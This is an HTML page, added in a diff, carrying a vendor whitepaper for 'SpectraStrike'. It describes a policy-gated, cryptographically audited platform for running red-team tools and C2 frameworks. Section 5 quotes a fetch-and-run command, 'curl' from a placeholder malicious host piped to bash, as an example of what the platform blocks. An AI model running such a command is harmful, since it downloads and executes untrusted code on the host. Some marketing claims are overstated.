@@ -1,0 +1,216 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>WHITEPAPER | SpectraStrike Documentation</title>
+  <meta name="description" content="Static SpectraStrike documentation and whitepapers by NyxeraLabs." />
+  <link rel="stylesheet" href="/pages/NyxeraLabs/SpectraStrike-Docs/assets/css/style.css" />
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+  <script>document.addEventListener('DOMContentLoaded', () => { if (window.mermaid) mermaid.initialize({ startOnLoad: true, securityLevel: 'loose' }); });</script>
+</head>
+<body>
+  <header class="topbar">
+    <div class="brand-wrap">
+      <img src="/pages/NyxeraLabs/SpectraStrike-Docs/assets/img/nyxera-logo.png" alt="NyxeraLabs logo" class="brand-logo" />
+      <img src="/pages/NyxeraLabs/SpectraStrike-Docs/assets/img/product-logo.png" alt="SpectraStrike logo" class="product-logo" />
+      <div>
+        <h1>SpectraStrike Documentation</h1>
+        <p>Static docs and whitepaper portal</p>
+      </div>
+    </div>
+    <nav class="nav">
+      <a href="/pages/NyxeraLabs/SpectraStrike-Docs/">Home</a>
+      <a href="/pages/NyxeraLabs/SpectraStrike-Docs/docs/end-user/">End User</a>
+      <a href="/pages/NyxeraLabs/SpectraStrike-Docs/docs/sdk/">SDK</a>
+      <a href="/pages/NyxeraLabs/SpectraStrike-Docs/docs/integration/">Integration</a>
+      <a href="/pages/NyxeraLabs/SpectraStrike-Docs/docs/architecture/">Architecture</a>
+      <a href="/pages/NyxeraLabs/SpectraStrike-Docs/docs/whitepaper/">Whitepaper</a>
+    </nav>
+  </header>
+
+  <main class="content">
+    <p><strong>SPECTRASTRIKE PLATFORM ARCHITECTURE WHITEPAPER</strong>
+<strong>Document Classification:</strong> PUBLIC (Whitepaper Draft)
+<strong>Subject:</strong> Policy-Driven, Cryptographically Verifiable Offensive Execution Fabric
+<strong>Target Audience:</strong> Chief Information Security Officers (CISO), Principal Security Architects, Military Cyber Commands, Tier-1 MSSPs.</p>
+
+<hr />
+
+<h1 id="executive-summary">EXECUTIVE SUMMARY</h1>
+
+<p>Modern offensive cybersecurity operations—spanning Red Teaming, automated Pentesting, and continuous Threat Simulation—have outgrown traditional script execution and monolithic C2 (Command &amp; Control) frameworks. As organizations scale offensive operations, the infrastructure used to simulate attacks becomes a prime target. If compromised, an offensive orchestration platform becomes a weaponized, highly privileged RCE (Remote Code Execution) engine against the very enterprise it was designed to protect.</p>
+
+<p><strong>SpectraStrike</strong> represents a paradigm shift from traditional “wrapper-based” pentest automation to a <strong>Universal Offensive Infrastructure-as-a-Service (IaaS)</strong>.</p>
+
+<p>Built on strict military-grade, Zero-Trust principles, SpectraStrike eliminates hardcoded integrations in favor of a <strong>Policy-Driven Universal Execution Fabric</strong>. It allows operators to safely execute arbitrary authorized tooling (from custom Python scripts to advanced frameworks like Sliver and Mythic) under a cryptographically verifiable, non-repudiable ledger.</p>
+
+<p>This whitepaper details the target-state architecture of SpectraStrike, explaining how it neutralizes insider threats, contains execution edge compromises, and provides mathematically verifiable proof of every action executed.</p>
+
+<hr />
+
+<h1 id="1-threat-model--design-philosophy">1. THREAT MODEL &amp; DESIGN PHILOSOPHY</h1>
+
+<p>SpectraStrike’s architecture is engineered around the <strong>Assume Breach / Compromise Assumed</strong> model. We design against three primary adversaries:</p>
+
+<ol>
+  <li><strong>The Captured Edge (External Adversary)</strong>: Execution nodes operate in hostile, monitored environments. We assume a node <em>will</em> be captured, reverse-engineered, or manipulated by a Blue Team or a real threat actor.</li>
+  <li><strong>The Malicious Insider (Rogue Operator)</strong>: A credentialed operator attempts to use the platform to target unauthorized infrastructure or deploy unauthorized tools, masking their tracks.</li>
+  <li><strong>The Supply Chain / Broker Compromise</strong>: An attacker compromises the message broker (RabbitMQ) or internal network and attempts to inject arbitrary commands to execution nodes.</li>
+</ol>
+
+<h3 id="foundational-defense-principles">Foundational Defense Principles</h3>
+<ul>
+  <li><strong>Cryptographic Execution Only</strong>: An execution node will not run a script simply because it received a message. It demands cryptographic proof (JWS) that the Control Plane authorized the exact payload, payload hash, and target.</li>
+  <li><strong>Decoupled Authorization</strong>: The application code does not make security decisions. All access and capability checks are offloaded to an immutable Open Policy Agent (OPA) engine.</li>
+  <li><strong>Non-Repudiation</strong>: Every intent, authorization, execution, and output is hashed and chained into an append-only Merkle Tree ledger. In a legal or operational dispute, SpectraStrike can mathematically prove exactly what happened, when, and by whom.</li>
+  <li><strong>Ephemeral Blast Radius</strong>: Code execution happens in sub-second, hardware-isolated microVMs that are destroyed immediately after execution.</li>
+</ul>
+
+<hr />
+
+<h1 id="2-macro-architecture-overview">2. MACRO ARCHITECTURE OVERVIEW</h1>
+
+<p>The SpectraStrike ecosystem is divided into four strictly isolated planes:</p>
+
+<ol>
+  <li><strong>Identity &amp; Policy Plane</strong>: SPIFFE/SPIRE for workload identity; OIDC for human identity; Open Policy Agent (OPA) for authorization.</li>
+  <li><strong>Control Plane (The Orchestrator)</strong>: A stateless, API-driven routing and cryptographic signing engine. It holds no execution capabilities.</li>
+  <li><strong>Execution Plane (The Edge)</strong>: Distributed Universal Runners and C2 Gateways operating in isolated environments.</li>
+  <li><strong>Audit &amp; State Plane</strong>: PostgreSQL with Row-Level Security (RLS) and a Cryptographic Merkle Tree Ledger.</li>
+</ol>
+
+<hr />
+
+<h1 id="3-the-cryptographic-execution-pipeline-step-by-step">3. THE CRYPTOGRAPHIC EXECUTION PIPELINE (Step-by-Step)</h1>
+
+<p>The core innovation of SpectraStrike is the BYOT (Bring Your Own Tool) execution pipeline. Here is the exact, granular flow of how a generic script or tool is safely executed.</p>
+
+<h3 id="step-1-intent-declaration-the-operator">Step 1: Intent Declaration (The Operator)</h3>
+<p>An operator submits a task via the API/Web UI. They do not submit raw code. They submit a <strong>Directed Acyclic Graph (DAG)</strong> in YAML/JSON format.</p>
+<ul>
+  <li><strong>Payload</strong>: Target URN (<code class="language-plaintext highlighter-rouge">urn:target:ip:10.0.0.5</code>), Tool Hash (<code class="language-plaintext highlighter-rouge">sha256:abc123...</code>), Parameters (<code class="language-plaintext highlighter-rouge">-p 443 --aggressive</code>).</li>
+  <li>The API enforces a strict schema and authenticates the operator via an OIDC token.</li>
+</ul>
+
+<h3 id="step-2-policy-evaluation-opa">Step 2: Policy Evaluation (OPA)</h3>
+<p>Before the Orchestrator accepts the task, it queries the <strong>Open Policy Agent (OPA)</strong> with the context:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">[Operator ID] +[Tenant ID] + [Tool Hash] + [Target URN]</code></li>
+  <li>OPA evaluates Rego policies: <em>Is this operator authorized? Does this tenant own this target? Is this specific Tool Hash whitelisted in “The Armory” for this environment?</em></li>
+  <li>If OPA denies, the request is dropped and an audit event is logged.</li>
+</ul>
+
+<h3 id="step-3-cryptographic-endorsement-the-jws-signer">Step 3: Cryptographic Endorsement (The JWS Signer)</h3>
+<p>If approved, the Control Plane constructs the <strong>Execution Manifest</strong>.</p>
+<ul>
+  <li>The Orchestrator requests a signature from HashiCorp Vault (or a cloud HSM).</li>
+  <li>The Manifest is signed using <strong>JWS (JSON Web Signature)</strong>.</li>
+  <li><em>Crucial Risk Mitigation</em>: Even if an attacker has fully compromised the RabbitMQ message broker, they do not have the HSM private key. They cannot forge a valid Execution Manifest.</li>
+</ul>
+
+<h3 id="step-4-asynchronous-dispatch-message-broker">Step 4: Asynchronous Dispatch (Message Broker)</h3>
+<p>The JWS-signed payload is published to the internal messaging backbone (RabbitMQ/Kafka).</p>
+<ul>
+  <li>Traffic flows over strictly enforced mTLS.</li>
+  <li>Tenant isolation is maintained via dedicated Virtual Hosts (vhosts) and Topic ACLs.</li>
+</ul>
+
+<h3 id="step-5-edge-verification-the-universal-runner">Step 5: Edge Verification (The Universal Runner)</h3>
+<p>The Universal Runner (a lightweight Go binary deployed on an edge node) pulls the message.</p>
+<ul>
+  <li><strong>Verification</strong>: The Runner fetches the Control Plane’s public key. It verifies the JWS signature.</li>
+  <li><strong>Anti-Replay</strong>: It checks the timestamp and nonce embedded in the JWS to ensure this isn’t a replayed attack.</li>
+  <li>If verification fails, the payload is destroyed and a critical security alert is sent upstream.</li>
+</ul>
+
+<h3 id="step-6-ephemeral-sandboxed-execution">Step 6: Ephemeral Sandboxed Execution</h3>
+<p>The Runner does not execute the script natively.</p>
+<ul>
+  <li>It pulls the signed tool container from the internal <strong>SpectraStrike Armory</strong> (an immutable OCI registry).</li>
+  <li>It spins up an ephemeral sandbox (e.g., AWS Firecracker microVM or gVisor container).</li>
+  <li><strong>Network Fencing</strong>: An eBPF/Cilium network policy is dynamically applied to the microVM, physically restricting outbound TCP/UDP traffic <em>only</em> to the authorized Target IP defined in the signed manifest.</li>
+  <li>The tool runs.</li>
+</ul>
+
+<h3 id="step-7-telemetry-standardization--ingestion">Step 7: Telemetry Standardization &amp; Ingestion</h3>
+<p>The executed tool writes its output. To support generic tools without custom wrappers, SpectraStrike mandates a contract:</p>
+<ul>
+  <li>The script must output findings to a mapped volume (<code class="language-plaintext highlighter-rouge">/output/findings.json</code>) following the open <strong>CloudEvents</strong> specification.</li>
+  <li>The Runner parses this JSON, attaches the exact JWS execution manifest as metadata, and pushes the structured telemetry back to the message broker.</li>
+  <li>The microVM is immediately destroyed.</li>
+</ul>
+
+<hr />
+
+<h1 id="4-the-c2-gateway-pattern-sliver-mythic-cobalt-strike">4. THE C2 GATEWAY PATTERN (Sliver, Mythic, Cobalt Strike)</h1>
+
+<p>For long-running, stateful operations (like managing active beacons), spinning up a microVM per command is unfeasible. SpectraStrike handles advanced C2 frameworks via the <strong>C2 Gateway Adapter Pattern</strong>.</p>
+
+<ul>
+  <li><strong>No Direct C2 Exposure</strong>: SpectraStrike never communicates directly with an implant/beacon.</li>
+  <li><strong>The Adapter</strong>: We deploy a dedicated microservice (e.g., <code class="language-plaintext highlighter-rouge">sliver-sync-gateway</code>).</li>
+  <li><strong>Ingestion (Implant -&gt; Platform)</strong>: When Sliver receives a callback, the Gateway listens to Sliver’s Multi-Player <code class="language-plaintext highlighter-rouge">gRPC</code> API. It translates Sliver’s proprietary session data into SpectraStrike’s universal CloudEvents JSON and pushes it to the Orchestrator.</li>
+  <li><strong>Execution (Platform -&gt; Implant)</strong>: When an Operator issues an interactive command via the SpectraStrike TUI, it undergoes the exact same OPA Policy Check and JWS Signing (Steps 1-3). The Gateway verifies the JWS, and only then translates the command back into a Sliver gRPC call.</li>
+</ul>
+
+<p>This allows SpectraStrike to act as a unified “pane of glass” and policy enforcer for <em>any</em> underlying C2 framework, without inheriting the C2’s architectural vulnerabilities.</p>
+
+<hr />
+
+<h1 id="5-the-armory-immutable-tool-registry">5. THE ARMORY (Immutable Tool Registry)</h1>
+
+<p>To prevent arbitrary script execution, SpectraStrike introduces <strong>The Armory</strong>.
+Operators cannot instruct the platform to <code class="language-plaintext highlighter-rouge">curl http://malicious.com/script.sh | bash</code>.</p>
+
+<ul>
+  <li>All tools (Sliver binaries, custom Python scripts, Nmap, OSINT scanners) must be pre-packaged as OCI container images or static binaries.</li>
+  <li>During ingestion, the tool is scanned for vulnerabilities (SBOM generation).</li>
+  <li>The tool is hashed (SHA-256) and signed via Sigstore/Cosign.</li>
+  <li>The execution Runner will <em>only</em> execute a binary if the hash precisely matches the hash signed in the Orchestrator’s JWS manifest.</li>
+</ul>
+
+<hr />
+
+<h1 id="6-forensic-ledger--non-repudiation">6. FORENSIC LEDGER &amp; NON-REPUDIATION</h1>
+
+<p>The most critical differentiator of SpectraStrike in an enterprise/military context is its ability to mathematically prove its actions.</p>
+
+<ul>
+  <li><strong>Append-Only Event Sourcing</strong>: The PostgreSQL database does not use mutable tables for operational state. It is an append-only event stream.</li>
+  <li><strong>Tamper-Evident Hash Chaining</strong>: Every execution request, OPA decision, and telemetry result is hashed. Each hash includes the hash of the previous event (Hash Chain).</li>
+  <li><strong>The Merkle Tree</strong>: Periodically, these chains are committed to a Merkle Tree (similar to Google Trillian).</li>
+  <li><strong>Client Verification</strong>: If a client claims SpectraStrike caused an outage at 14:00, the platform can export the cryptographically signed ledger. Third-party auditors can mathematically verify that either the platform did or did not execute a specific packet payload at that time, and that the database logs have not been altered post-incident by a rogue Database Administrator.</li>
+</ul>
+
+<hr />
+
+<h1 id="7-identity--tenant-isolation">7. IDENTITY &amp; TENANT ISOLATION</h1>
+
+<p>SpectraStrike guarantees strong isolation for Multi-Tenant and SaaS deployments:</p>
+
+<ul>
+  <li><strong>Workload Identity (SPIFFE/SPIRE)</strong>: Static API keys and permanent TLS certificates are obsolete. Every component (Orchestrator, Runner, Gateway, RabbitMQ node) is issued a cryptographically verifiable identity document (SVID) that rotates automatically every hour. Mutual TLS (mTLS) is established dynamically based on these identities.</li>
+  <li><strong>Data at Rest Isolation</strong>: PostgreSQL implements strict <strong>Row-Level Security (RLS)</strong>. The application context injects the <code class="language-plaintext highlighter-rouge">tenant_id</code> at the connection pool level. It is mathematically impossible for a SQL injection vulnerability in the application layer to leak data belonging to Tenant B while operating under Tenant A’s context.</li>
+</ul>
+
+<hr />
+
+<h1 id="8-strategic-advantage">8. STRATEGIC ADVANTAGE</h1>
+
+<p>By adopting this architecture, SpectraStrike transitions from a standard “Pentest Tool” to a <strong>Military-Grade Offensive Fabric</strong>.</p>
+
+<ol>
+  <li><strong>Infinite Extensibility (BYOT)</strong>: Rapid integration of new TTPs, C2 frameworks, and custom scripts without modifying the core platform codebase.</li>
+  <li><strong>Unprecedented Auditability</strong>: The only platform capable of cryptographic non-repudiation for offensive operations.</li>
+  <li><strong>Procurement Friction Removal</strong>: Designed specifically to pass the most rigorous Tier-1 enterprise and government security assessments by eliminating the risk of the platform becoming a weaponized C2 backdoor.</li>
+</ol>
+
+  </main>
+
+  <footer class="footer">
+    <span>SpectraStrike by NyxeraLabs — All Rights Reserved © <span id="year"></span></span>
+  </footer>
+  <script>document.getElementById('year').textContent = new Date().getFullYear();</script>
+</body>
+</html>
